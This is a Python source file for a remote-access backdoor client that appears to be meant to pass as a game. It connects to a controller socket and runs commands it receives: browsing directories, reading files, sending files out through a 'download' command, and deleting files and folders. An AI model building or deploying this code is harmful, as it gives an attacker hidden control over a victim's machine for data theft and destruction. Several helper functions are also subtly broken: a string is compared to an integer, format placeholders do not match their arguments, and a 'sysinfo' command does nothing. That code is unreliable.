import socket as st
import os,shutil
import importlib.util
import platform
# from colorama import Fore, Style

def get_system_information():
    if platform.system() == 'Windows':
        getBuildNumber = platform.version().split('.')[2]
        if getBuildNumber < 22000:
            os_name = 'Windows 10'
        elif getBuildNumber >= 22000:
            os_name = 'Windows 11'
        else:
            os_name = None
    return """
    {}\n
    Device name : {}
    System : {}
    OS version : {}
    Architecture : {}
    Machine : {}
    Processor : {}
    Core : {}\n\n
    {}
    """.format(
        'SYSTEM INFORMATION'.center(150),
        os_name,
        platform.node(),
        platform.version(),
        platform.architecture(),
        platform.machine(),
        platform.processor(),
        os.cpu_count(),
        
    )

def main():
    sock = st.socket(st.AF_INET, st.SOCK_STREAM)
    sock.connect(('127.0.0.1', 7777))

    while True:
        get_cmd = sock.recv(1024).decode().strip()
        if not get_cmd:  
            print("Connection closed by server.")
            break 

        try:
            if get_cmd.startswith('cd '):  
                _dir = get_cmd.split(maxsplit=1)[1]  
                os.chdir(_dir)  
                sock.send(b"Directory changed successfully\n")

            elif get_cmd == 'sysinfo':
                pass

            elif get_cmd.startswith('which '):
                get_exec = get_cmd.split()[1]
                get_exec_loc = shutil.which(get_exec)
                sock.send(get_exec_loc.encode())

            elif get_cmd.startswith('rm '):
                file_name = get_cmd.split()[1]
                if os.path.exists(file_name):
                    os.remove(file_name)
                    sock.send('The file \'{}\' removed successfully'.format(file_name).encode())
                else:
                    sock.send('The file \'{}\' doesnt exist'.format(file_name).encode())

            # elif get_cmd

            elif get_cmd.startswith('rmdir '):
                folder_name = get_cmd.split()[1]
                if os.path.exists(folder_name):
                    shutil.rmtree(folder_name)
                    sock.send('The folder \'{}\' removed successfully'.format(folder_name).encode())
                else:
                    sock.send('The folder \'{}\' doesnt exist'.format(folder_name).encode())

            elif get_cmd == 'ls':
                _dir = os.getcwd()
                files = '\n'.join(os.listdir(_dir))
                sock.sendall(files.encode() + b'\n')
            
            elif get_cmd.startswith('cat '):  # Read and send file contents
                file_path = get_cmd.split()[1]
                if os.path.exists(file_path) and os.path.isfile(file_path):
                    with open(file_path, "r") as f:
                        sock.sendall(f.read().encode())
                else:
                    sock.send(b"Error: File not found\n")

            elif get_cmd.startswith('download '):  
                try:
                    dfile = '{}/{}'.format(os.getcwd(),get_cmd.split()[1])
                    if os.path.isfile(dfile):
                        with open(dfile,'rb') as file:
                            sock.sendfile(file)
                        sock.shutdown(st.SHUT_WR)
                        file.close()
                    else:
                        sock.send('{} is not a file'.format(dfile).encode())
                except Exception as e:
                    sock.send(str(e).encode())


            elif get_cmd in ('pwd', 'cwd'):  
                sock.send(os.getcwd().encode() + b"\n")

            else:
                sock.send('Invalid command found : {}'.format(get_cmd).encode())

        except Exception as err:
            print(err)
            sock.send(str(err).encode())
            continue
        
        except ConnectionResetError:
            sock.close()

    sock.close()
    # os.system('clear')
    # print('Game window closed...')

def configureApp():
    os.system('python3 -m venv env')
    os.system('source env/bin/activate')
    packs = ['tk','socket','sys','os']
    for lst_pk in packs:
        if importlib.util.find_spec(lst_pk) is not None:
            print('{} is installed'.format(lst_pk))
        else:
            os.system('pip install {}'.format(lst_pk))

